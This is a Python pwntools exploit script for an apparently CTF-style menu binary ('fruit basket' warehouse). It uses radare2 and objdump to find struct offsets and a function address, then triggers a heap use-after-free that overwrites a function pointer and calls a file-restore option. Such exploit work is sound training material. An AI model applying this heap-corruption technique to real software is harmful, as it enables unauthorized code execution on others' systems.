from pwn import *
import re
import r2pipe
import sys

io=process("./bin{}".format(sys.argv[1]))

def view():
    io.sendlineafter(">> ",'2')

def add(size,tag):
    io.sendlineafter(">> ",'3')
    io.sendlineafter("add\n",'1')
    io.sendlineafter("tag : ",str(size))
    io.sendlineafter("Fruit : ",tag)

def create_basket(payload):
    io.sendlineafter(">> ",'1')
    io.sendlineafter("basket : ",payload)

def free(idx):
    io.sendlineafter(">> ",'4')
    io.sendlineafter("id : ",str(idx))

def restore(filename):
    io.sendlineafter(">> ",'6')
    io.sendlineafter("tag : ",filename)

proc = subprocess.Popen(["objdump -M intel -d bin{} | grep '<viewWarehouse>'".format(sys.argv[1])], stdout=subprocess.PIPE ,shell = True)
(out ,err) = proc.communicate()
view_warehouse = int(out[:16],16)
log.info("ViewWarehouse = " + hex(view_warehouse))

r = r2pipe.open("./bin{}".format(sys.argv[1]))
r.cmd('aaaaa')
r.cmd('s main')
r.cmd('s sym.addFruit')
r.cmd('so 75')
try:
    offset_1 = int(r.cmd('pd 1').split()[-2].strip(",").strip("]"),16)
except ValueError:
    offset_1 = 0
except:
    print "Something else went wrong"

r.cmd('s sym.addPrintFunc')
r.cmd('so 17')

try:
    offset_print_func = int(r.cmd('pd 1').split()[-2].strip(",").strip("]"),16)
    log.info("offset_print_func = " + hex(offset_print_func))
except ValueError:
    offset_print_func = 0
except:
    print "Something else went wrong"


log.info("Offset_print_func = " + hex(offset_print_func))
log.info("Offset_1 = " + hex(offset_1))

if(offset_1==0):
    if(offset_print_func==8):
        payload = p64(1) + p64(view_warehouse)
    elif(offset_print_func==16):
        payload = p64(1) + p64(0) + p64(view_warehouse)
    elif(offset_print_func==24):
        payload = p64(1) + p64(0)*2 + p64(view_warehouse)

elif(offset_1==8):
    if(offset_print_func==0):
        payload = p64(view_warehouse) + p64(1)
    elif(offset_print_func==16):
        payload = p64(0) + p64(1) + p64(view_warehouse)
    elif(offset_print_func==24):
        payload = p64(0) + p64(1) + p64(0) + p64(view_warehouse)

elif(offset_1==16):
    if(offset_print_func==0):
        payload = p64(view_warehouse) + p64(0) + p64(1)
    elif(offset_print_func==8):
        payload = p64(0) + p64(view_warehouse) + p64(1)
    elif(offset_print_func==24):
        payload = p64(0)*2 + p64(1) + p64(view_warehouse)

elif(offset_1==24):
    if(offset_print_func==0):
        payload = p64(view_warehouse) + p64(0)*2 + p64(1)
    elif(offset_print_func==8):
        payload = p64(0) + p64(view_warehouse) + p64(0) + p64(1)
    elif(offset_print_func==16):
        payload = p64(0)*2 + p64(view_warehouse) + p64(1)

create_basket('a'*8)
add(0x50,'a'*8)
gdb.attach(io)
free(0)
add(0x21,payload)
view()
io.recvuntil("baskets:")
io.recvline()
a = io.recvline()
f = []
while(bool(re.search(r'\w',a))):
    f.append(a.strip('\n'))
    a = io.recvline()
files = f
log.info(files)
for i in range(len(files)):
    log.info(files[i])
    restore(files[i])
    view()

io.close()
